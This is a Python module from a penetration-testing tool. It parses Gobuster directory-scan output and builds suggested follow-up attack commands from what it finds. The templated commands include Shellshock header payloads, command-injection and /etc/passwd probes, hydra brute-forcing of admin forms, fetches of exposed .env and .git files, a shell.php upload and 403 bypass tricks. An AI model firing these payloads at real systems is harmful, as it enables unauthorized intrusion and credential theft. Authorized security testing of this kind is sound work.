#!/usr/bin/env python3
"""
souleyez.parsers.gobuster_parser

Parses Gobuster directory/file enumeration output into structured data.
"""

import re
from typing import Any, Dict, List
from urllib.parse import urlparse


def parse_gobuster_output(output: str, target: str = "") -> Dict[str, Any]:
    """
    Parse Gobuster dir mode output and extract discovered paths.

    Gobuster output format:
    ===============================================================
    Gobuster v3.8
    ===============================================================
    [+] Url:                     http://example.com
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /path/to/wordlist.txt
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /admin                (Status: 200) [Size: 1234]
    /images               (Status: 301) [Size: 169] [--> http://example.com/images/]
    /cgi-bin/             (Status: 403) [Size: 276]
    ===============================================================
    Finished
    ===============================================================

    Args:
        output: Raw gobuster output text
        target: Target URL from job

    Returns:
        Dict with structure:
        {
            'target_url': str,
            'paths': [
                {
                    'path': str,
                    'status_code': int,
                    'size': int,
                    'redirect': str  # if present
                },
                ...
            ]
        }
    """
    result = {"target_url": target, "paths": []}

    # Strip ANSI escape codes from output (gobuster progress lines contain these)
    ansi_escape = re.compile(r"\x1b\[[0-9;]*[a-zA-Z]")
    output = ansi_escape.sub("", output)

    lines = output.split("\n")

    for line in lines:
        line = line.strip()

        # Skip progress lines (gobuster v3.6+ outputs these on Ubuntu/newer systems)
        # Format: "Progress: 12345 / 50798 (24.30%)"
        if line.startswith("Progress:"):
            continue

        # Extract target URL from header
        if line.startswith("[+] Url:"):
            url_match = re.search(r"\[?\+\]?\s*Url:\s+(\S+)", line)
            if url_match:
                result["target_url"] = url_match.group(1)

        # Parse discovered paths
        # Format (v3.6 and earlier): /path                (Status: NNN) [Size: NNN] [--> redirect]
        # Format (v3.8+): path                (Status: NNN) [Size: NNN] [--> redirect]
        elif (
            "(Status:" in line and not line.startswith("[") and not line.startswith("=")
        ):
            path_data = _parse_path_line(line, result["target_url"])
            if path_data:
                result["paths"].append(path_data)

    return result


def _parse_path_line(line: str, base_url: str = "") -> Dict[str, Any]:
    """
    Parse a single gobuster path discovery line.

    Example formats:
    /admin                (Status: 200) [Size: 1234]
    /images               (Status: 301) [Size: 169] [--> http://example.com/images/]
    /cgi-bin/             (Status: 403) [Size: 276]
    admin                 (Status: 308) [Size: 253]  # v3.8+ format without leading /

    Returns:
        Dict with path info or None if parsing fails
    """
    try:
        # Extract path (everything before first parenthesis or multiple spaces)
        # Handle both /path and path formats (v3.8+ outputs without leading /)
        path_match = re.match(r"^(/?[^\s(]+)\s+", line)
        if not path_match:
            return None

        path = path_match.group(1).strip()
        # Ensure path starts with /
        if not path.startswith("/"):
            path = "/" + path

        # Extract status code
        status_match = re.search(r"\(Status:\s*(\d+)\)", line)
        status_code = int(status_match.group(1)) if status_match else None

        # Extract size
        size_match = re.search(r"\[Size:\s*(\d+)\]", line)
        size = int(size_match.group(1)) if size_match else None

        # Extract redirect target if present
        redirect_match = re.search(r"\[-+>\s*([^\]]+)\]", line)
        redirect = redirect_match.group(1).strip() if redirect_match else None

        # Build full URL
        if base_url:
            parsed = urlparse(base_url)
            full_url = f"{parsed.scheme}://{parsed.netloc}{path}"
        else:
            full_url = path

        return {
            "path": path,
            "url": full_url,
            "status_code": status_code,
            "size": size,
            "redirect": redirect,
        }
    except Exception:
        return None


def get_paths_stats(parsed: Dict[str, Any]) -> Dict[str, int]:
    """
    Get statistics from parsed gobuster results.

    Args:
        parsed: Output from parse_gobuster_output()

    Returns:
        Dict with counts by status code: {'200': 5, '301': 3, '403': 2, ...}
    """
    stats = {"total": len(parsed.get("paths", [])), "redirects": 0, "by_status": {}}

    for path in parsed.get("paths", []):
        status = str(path.get("status_code", "unknown"))
        stats["by_status"][status] = stats["by_status"].get(status, 0) + 1

        # Count redirects (301, 302, 303, 307, 308)
        if path.get("redirect"):
            stats["redirects"] += 1

    return stats


def categorize_status(status_code: int) -> str:
    """
    Categorize HTTP status codes.

    Returns: 'success', 'redirect', 'client_error', 'server_error', 'unknown'
    """
    if 200 <= status_code < 300:
        return "success"
    elif 300 <= status_code < 400:
        return "redirect"
    elif 400 <= status_code < 500:
        return "client_error"
    elif 500 <= status_code < 600:
        return "server_error"
    else:
        return "unknown"


def generate_next_steps(parsed: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Generate suggested next steps based on gobuster findings.

    Each step includes:
    - title: Short description of what to try
    - commands: Example commands to run
    - reason: Why this step is suggested

    Args:
        parsed: Output from parse_gobuster_output()

    Returns:
        List of next step dicts
    """
    next_steps = []
    paths = parsed.get("paths", [])
    base_url = parsed.get("target_url", "").rstrip("/")

    if not paths:
        return next_steps

    # Categorize found paths
    git_paths = []
    env_paths = []
    backup_paths = []
    admin_paths = []
    cgi_paths = []
    wp_paths = []
    api_paths = []
    config_paths = []
    upload_paths = []

    for path_info in paths:
        path = path_info.get("path", "").lower()
        url = path_info.get("url", "")
        status = path_info.get("status_code", 0)

        # Skip 404s
        if status == 404:
            continue

        # Git exposure
        if ".git" in path:
            git_paths.append(url)
        # Environment files
        elif ".env" in path or "env." in path:
            env_paths.append(url)
        # Backup files
        elif any(
            ext in path
            for ext in [".bak", ".backup", ".old", ".orig", ".save", ".swp", "~"]
        ):
            backup_paths.append(url)
        # Config files
        elif any(
            kw in path
            for kw in [
                "config",
                "settings",
                "database",
                ".ini",
                ".yml",
                ".yaml",
                ".xml",
                ".conf",
            ]
        ):
            config_paths.append(url)
        # Admin panels
        elif any(
            kw in path
            for kw in ["admin", "manager", "dashboard", "cpanel", "webadmin", "control"]
        ):
            admin_paths.append(url)
        # CGI scripts
        elif (
            "/cgi-bin/" in path
            or path.endswith(".cgi")
            or path.endswith(".pl")
            or path.endswith(".sh")
        ):
            cgi_paths.append(url)
        # WordPress
        elif any(
            kw in path
            for kw in ["wp-", "wordpress", "wp-content", "wp-admin", "wp-includes"]
        ):
            wp_paths.append(url)
        # API endpoints
        elif any(
            kw in path
            for kw in [
                "/api",
                "/rest",
                "/graphql",
                "/v1/",
                "/v2/",
                "/swagger",
                "/openapi",
            ]
        ):
            api_paths.append(url)
        # Upload directories
        elif any(
            kw in path for kw in ["upload", "uploads", "files", "media", "attachments"]
        ):
            upload_paths.append(url)

    # Git repository exposure
    if git_paths:
        next_steps.append(
            {
                "title": "Extract source code from exposed .git",
                "commands": [
                    f"git-dumper {git_paths[0]} ./git-dump",
                    f"# Or manually: wget -r -np -nH --cut-dirs=1 {git_paths[0]}",
                ],
                "reason": f"Found .git directory - may contain full source code and commit history",
            }
        )

    # Environment file exposure
    if env_paths:
        next_steps.append(
            {
                "title": "Check exposed environment files for secrets",
                "commands": [f'curl -s "{url}"' for url in env_paths[:3]],
                "reason": f"Found {len(env_paths)} .env file(s) - likely contains API keys, passwords, database creds",
            }
        )

    # Backup files
    if backup_paths:
        next_steps.append(
            {
                "title": "Download backup files for source review",
                "commands": [
                    f'curl -s "{url}" -o backup_file' for url in backup_paths[:3]
                ],
                "reason": f"Found {len(backup_paths)} backup file(s) - may contain source code or sensitive data",
            }
        )

    # Config files
    if config_paths:
        next_steps.append(
            {
                "title": "Review configuration files for sensitive data",
                "commands": [f'curl -s "{url}"' for url in config_paths[:3]],
                "reason": f"Found {len(config_paths)} config file(s) - check for hardcoded credentials",
            }
        )

    # Admin panels
    if admin_paths:
        next_steps.append(
            {
                "title": "Test admin panel with default credentials",
                "commands": [
                    f"# Check login form at: {admin_paths[0]}",
                    f'hydra -L data/wordlists/usernames_common.txt -P data/wordlists/top20_quick.txt {base_url} http-post-form "/admin:user=^USER^&pass=^PASS^:Invalid"',
                ],
                "reason": f"Found {len(admin_paths)} admin panel(s) - try admin:admin, admin:password, etc.",
            }
        )

    # CGI scripts
    if cgi_paths:
        example = cgi_paths[0]
        next_steps.append(
            {
                "title": "Test CGI scripts for command injection",
                "commands": [
                    f'curl "{example}?cmd=id"',
                    f'curl "{example}?file=/etc/passwd"',
                ],
                "reason": f"Found {len(cgi_paths)} CGI script(s) - test for command injection and LFI",
            }
        )
        next_steps.append(
            {
                "title": "Test for Shellshock (CVE-2014-6271)",
                "commands": [
                    f"curl -A '() {{ :; }}; echo; /bin/id' \"{example}\"",
                    f'curl -H "Cookie: () {{ :; }}; /bin/id" "{example}"',
                ],
                "reason": "CGI scripts may be vulnerable to Shellshock on older systems",
            }
        )

    # WordPress paths
    if wp_paths:
        next_steps.append(
            {
                "title": "Run WPScan for WordPress enumeration",
                "commands": [
                    f"wpscan --url {base_url} --enumerate u,p,t,cb",
                    f"wpscan --url {base_url} --passwords data/wordlists/passwords_brute.txt --usernames admin",
                ],
                "reason": f"WordPress detected - enumerate users, plugins, themes for vulnerabilities",
            }
        )

    # API endpoints
    if api_paths:
        next_steps.append(
            {
                "title": "Enumerate API endpoints",
                "commands": [
                    f'curl -s "{api_paths[0]}" | jq .',
                    f'ffuf -u "{base_url}/api/FUZZ" -w data/wordlists/api_endpoints_large.txt',
                ],
                "reason": f"Found {len(api_paths)} API endpoint(s) - test for auth bypass, IDOR, injection",
            }
        )

    # Upload directories
    if upload_paths:
        next_steps.append(
            {
                "title": "Check upload directory for unrestricted file upload",
                "commands": [
                    f'curl -s "{upload_paths[0]}"',
                    f'# If writable, test: curl -X PUT -d "@shell.php" "{upload_paths[0]}/shell.php"',
                ],
                "reason": f"Found upload directory - check for directory listing and file upload vulnerabilities",
            }
        )

    # If we found interesting 403 paths, suggest bypass techniques
    forbidden_paths = [p for p in paths if p.get("status_code") == 403]
    interesting_forbidden = [
        p
        for p in forbidden_paths
        if any(
            kw in p.get("path", "").lower()
            for kw in [
                "admin",
                "api",
                "config",
                "backup",
                "internal",
                "private",
                "secret",
            ]
        )
    ]
    if interesting_forbidden:
        example = interesting_forbidden[0].get("url", "")
        next_steps.append(
            {
                "title": "403 bypass techniques for restricted paths",
                "commands": [
                    f'# Try path traversal: curl "{example}..;/"',
                    f'# Try header bypass: curl -H "X-Original-URL: {interesting_forbidden[0].get("path", "")}" "{base_url}"',
                    f'# Try method override: curl -X POST "{example}"',
                ],
                "reason": f"Found {len(interesting_forbidden)} interesting 403 path(s) - worth trying bypass techniques",
            }
        )

    return next_steps
